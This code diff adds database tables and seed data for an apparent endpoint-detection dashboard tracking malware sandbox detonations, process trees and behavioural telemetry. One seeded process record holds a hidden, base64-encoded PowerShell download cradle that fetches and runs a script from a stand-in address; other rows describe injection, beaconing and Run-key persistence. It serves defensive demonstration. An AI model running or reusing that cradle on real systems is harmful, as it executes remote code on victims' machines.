@@ -2685,6 +2685,78 @@ export function initDb(dbOrPath, options = {}) {
 
     CREATE INDEX IF NOT EXISTS idx_iwi_val ON ioc_watchlist_indicators(indicator_value);
     CREATE INDEX IF NOT EXISTS idx_iwi_active ON ioc_watchlist_indicators(is_active);
+    -- 130. SANDBOX_DETONATION_JOBS — Automated Malware Sandbox Detonation & Dynamic Analysis
+    CREATE TABLE IF NOT EXISTS sandbox_detonation_jobs (
+      id TEXT PRIMARY KEY,
+      device_id TEXT NOT NULL,
+      hostname TEXT NOT NULL,
+      sample_name TEXT NOT NULL,
+      sample_type TEXT NOT NULL CHECK(sample_type IN ('EXECUTABLE', 'POWERSHELL_SCRIPT', 'BATCH_SCRIPT', 'OFFICE_MACRO', 'DYNAMIC_LINK_LIB', 'URL_PAYLOAD')),
+      sample_sha256 TEXT NOT NULL,
+      file_path TEXT,
+      file_size_bytes INTEGER NOT NULL DEFAULT 0,
+      status TEXT NOT NULL DEFAULT 'QUEUED' CHECK(status IN ('QUEUED', 'DETONATING', 'COMPLETED', 'FAILED', 'TIMED_OUT', 'CANCELLED')),
+      verdict TEXT NOT NULL DEFAULT 'PENDING' CHECK(verdict IN ('PENDING', 'BENIGN', 'SUSPICIOUS', 'MALICIOUS', 'UNKNOWN')),
+      risk_score INTEGER NOT NULL DEFAULT 0 CHECK(risk_score >= 0 AND risk_score <= 100),
+      sandbox_env TEXT NOT NULL DEFAULT 'WIN11_SANDBOX_SECURE' CHECK(sandbox_env IN ('WIN11_SANDBOX_SECURE', 'WIN10_LEGACY_ISOLATED', 'HVCI_RESTRICTED')),
+      execution_duration_sec INTEGER NOT NULL DEFAULT 0,
+      mitre_tactics_json TEXT NOT NULL DEFAULT '[]',
+      automated_remediation TEXT NOT NULL DEFAULT 'NONE' CHECK(automated_remediation IN ('NONE', 'QUARANTINE_FILE', 'ISOLATE_ENDPOINT', 'KILL_PROCESS_TREE')),
+      created_at TEXT DEFAULT (DATETIME('now')),
+      completed_at TEXT,
+      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
+    );
+
+    CREATE INDEX IF NOT EXISTS idx_sdj_status ON sandbox_detonation_jobs(status);
+    CREATE INDEX IF NOT EXISTS idx_sdj_verdict ON sandbox_detonation_jobs(verdict);
+    CREATE INDEX IF NOT EXISTS idx_sdj_device ON sandbox_detonation_jobs(device_id);
+
+    -- 131. PROCESS_LINEAGE_NODES — EDR Process Execution Lineage & Parent-Child Trees
+    CREATE TABLE IF NOT EXISTS process_lineage_nodes (
+      id TEXT PRIMARY KEY,
+      detonation_id TEXT,
+      device_id TEXT NOT NULL,
+      hostname TEXT NOT NULL,
+      process_id INTEGER NOT NULL,
+      parent_process_id INTEGER NOT NULL,
+      process_name TEXT NOT NULL,
+      parent_process_name TEXT NOT NULL,
+      command_line TEXT,
+      executable_path TEXT NOT NULL,
+      sha256_hash TEXT,
+      integrity_level TEXT NOT NULL DEFAULT 'MEDIUM' CHECK(integrity_level IN ('UNTRUSTED', 'LOW', 'MEDIUM', 'HIGH', 'SYSTEM')),
+      user_sid TEXT NOT NULL DEFAULT 'S-1-5-18',
+      spawned_at TEXT DEFAULT (DATETIME('now')),
+      terminated_at TEXT,
+      is_anomalous INTEGER NOT NULL DEFAULT 0 CHECK(is_anomalous IN (0, 1)),
+      anomaly_reasons_json TEXT NOT NULL DEFAULT '[]',
+      FOREIGN KEY(detonation_id) REFERENCES sandbox_detonation_jobs(id) ON DELETE SET NULL,
+      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
+    );
+
+    CREATE INDEX IF NOT EXISTS idx_pln_detonation ON process_lineage_nodes(detonation_id);
+    CREATE INDEX IF NOT EXISTS idx_pln_device ON process_lineage_nodes(device_id);
+    CREATE INDEX IF NOT EXISTS idx_pln_pid ON process_lineage_nodes(process_id);
+
+    -- 132. BEHAVIORAL_TELEMETRY_EVENTS — Granular EDR Activity Logs (Injections, Drops, Beacons)
+    CREATE TABLE IF NOT EXISTS behavioral_telemetry_events (
+      id TEXT PRIMARY KEY,
+      detonation_id TEXT,
+      process_id INTEGER NOT NULL,
+      process_name TEXT NOT NULL,
+      event_category TEXT NOT NULL CHECK(event_category IN ('PROCESS_INJECTION', 'FILE_WRITE_DROP', 'REGISTRY_PERSISTENCE', 'C2_NETWORK_BEACON', 'CREDENTIAL_ACCESS', 'DEFENSE_EVASION')),
+      event_action TEXT NOT NULL,
+      target_object TEXT NOT NULL,
+      details_json TEXT NOT NULL DEFAULT '{}',
+      severity TEXT NOT NULL DEFAULT 'INFO' CHECK(severity IN ('INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
+      mitre_technique TEXT,
+      timestamp TEXT DEFAULT (DATETIME('now')),
+      FOREIGN KEY(detonation_id) REFERENCES sandbox_detonation_jobs(id) ON DELETE CASCADE
+    );
+
+    CREATE INDEX IF NOT EXISTS idx_bte_detonation ON behavioral_telemetry_events(detonation_id);
+    CREATE INDEX IF NOT EXISTS idx_bte_category ON behavioral_telemetry_events(event_category);
+    CREATE INDEX IF NOT EXISTS idx_bte_severity ON behavioral_telemetry_events(severity);
   `);
 
   // Schema migrations for existing databases
@@ -6107,6 +6179,167 @@ exit 0`,
     insertIoc.run('ioc-lockbit-sha256', 'SHA256', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'LockBit 3.0 Ransomware Encryptor', 'HIGH', 'CONTAIN_HOST', 1);
     insertIoc.run('ioc-c2-ip', 'IP', '198.51.100.42', 'APT29 Command & Control Server', 'HIGH', 'ALERT', 1);
     insertIoc.run('ioc-cobalt-pipe', 'MUTEX', '\\\\.\\pipe\\msagent_c2', 'Cobalt Strike Default Named Pipe', 'HIGH', 'KILL_PROCESS', 1);
+  }
+  // 47. Seed Endpoint Behavioral Sandbox Detonation & Process Lineage Graphs
+  const sandboxJobCount = db.prepare('SELECT COUNT(*) as count FROM sandbox_detonation_jobs').get().count;
+  if (sandboxJobCount === 0) {
+    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
+      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();
+
+    const devId = sampleDevice ? sampleDevice.id : 'dev-baseline-01';
+    const devHost = sampleDevice ? sampleDevice.hostname : 'DESKTOP-R0H12DJ';
+
+    const insertJob = db.prepare(`
+      INSERT OR IGNORE INTO sandbox_detonation_jobs (
+        id, device_id, hostname, sample_name, sample_type, sample_sha256, file_path,
+        file_size_bytes, status, verdict, risk_score, sandbox_env, execution_duration_sec,
+        mitre_tactics_json, automated_remediation, created_at, completed_at
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-2 hours'), DATETIME('now', '-1 hour'))
+    `);
+
+    insertJob.run(
+      'det-sample-qakbot',
+      devId,
+      devHost,
+      'invoice_oct_report.exe',
+      'EXECUTABLE',
+      '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae',
+      'C:\\Users\\Family\\Downloads\\invoice_oct_report.exe',
+      1048576,
+      'COMPLETED',
+      'MALICIOUS',
+      92,
+      'WIN11_SANDBOX_SECURE',
+      45,
+      JSON.stringify(['Execution', 'Defense Evasion', 'Command and Control', 'Credential Access']),
+      'ISOLATE_ENDPOINT'
+    );
+
+    insertJob.run(
+      'det-sample-procdump',
+      devId,
+      devHost,
+      'procdump64.exe',
+      'EXECUTABLE',
+      'a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e',
+      'C:\\Tools\\procdump64.exe',
+      6291456,
+      'COMPLETED',
+      'SUSPICIOUS',
+      55,
+      'WIN11_SANDBOX_SECURE',
+      30,
+      JSON.stringify(['Credential Access', 'Discovery']),
+      'NONE'
+    );
+
+    const insertNode = db.prepare(`
+      INSERT OR IGNORE INTO process_lineage_nodes (
+        id, detonation_id, device_id, hostname, process_id, parent_process_id,
+        process_name, parent_process_name, command_line, executable_path, sha256_hash,
+        integrity_level, user_sid, spawned_at, terminated_at, is_anomalous, anomaly_reasons_json
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-2 hours'), DATETIME('now', '-1 hour'), ?, ?)
+    `);
+
+    insertNode.run(
+      'pln-node-01',
+      'det-sample-qakbot',
+      devId,
+      devHost,
+      1840,
+      800,
+      'explorer.exe',
+      'userinit.exe',
+      'C:\\Windows\\Explorer.EXE',
+      'C:\\Windows\\explorer.exe',
+      '4a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b',
+      'MEDIUM',
+      'S-1-5-21-3920194-1001',
+      0,
+      '[]'
+    );
+
+    insertNode.run(
+      'pln-node-02',
+      'det-sample-qakbot',
+      devId,
+      devHost,
+      4920,
+      1840,
+      'invoice_oct_report.exe',
+      'explorer.exe',
+      '"C:\\Users\\Family\\Downloads\\invoice_oct_report.exe"',
+      'C:\\Users\\Family\\Downloads\\invoice_oct_report.exe',
+      '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae',
+      'MEDIUM',
+      'S-1-5-21-3920194-1001',
+      1,
+      JSON.stringify(['Masquerading as PDF document', 'Unsigned binary executing from Downloads folder'])
+    );
+
+    insertNode.run(
+      'pln-node-03',
+      'det-sample-qakbot',
+      devId,
+      devHost,
+      6104,
+      4920,
+      'powershell.exe',
+      'invoice_oct_report.exe',
+      'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANAAyAC8AYgBlAGEAYwBvAG4ALgBwAHMAMQAiACkA',
+      'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+      '9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b',
+      'MEDIUM',
+      'S-1-5-21-3920194-1001',
+      1,
+      JSON.stringify(['Hidden window mode execution', 'Base64 encoded payload download cradle'])
+    );
+
+    const insertEvent = db.prepare(`
+      INSERT OR IGNORE INTO behavioral_telemetry_events (
+        id, detonation_id, process_id, process_name, event_category, event_action,
+        target_object, details_json, severity, mitre_technique, timestamp
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-90 minutes'))
+    `);
+
+    insertEvent.run(
+      'bte-ev-01',
+      'det-sample-qakbot',
+      4920,
+      'invoice_oct_report.exe',
+      'PROCESS_INJECTION',
+      'NtWriteVirtualMemory',
+      'Target PID 1840 (explorer.exe)',
+      JSON.stringify({ address: '0x00007FF728B40000', size_bytes: 4096, protection: 'PAGE_EXECUTE_READWRITE' }),
+      'CRITICAL',
+      'T1055'
+    );
+
+    insertEvent.run(
+      'bte-ev-02',
+      'det-sample-qakbot',
+      6104,
+      'powershell.exe',
+      'C2_NETWORK_BEACON',
+      'TcpConnect',
+      '198.51.100.42:443',
+      JSON.stringify({ remote_ip: '198.51.100.42', remote_port: 443, protocol: 'HTTPS', tls_ja3_fingerprint: 'e7d705a3286e19ea42f587b344ee6865' }),
+      'CRITICAL',
+      'T1071.001'
+    );
+
+    insertEvent.run(
+      'bte-ev-03',
+      'det-sample-qakbot',
+      4920,
+      'invoice_oct_report.exe',
+      'REGISTRY_PERSISTENCE',
+      'RegSetValueEx',
+      'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityAssistant',
+      JSON.stringify({ value_name: 'SecurityAssistant', data: 'C:\\ProgramData\\SecurityService.exe' }),
+      'HIGH',
+      'T1547.001'
+    );
   }
 
 }
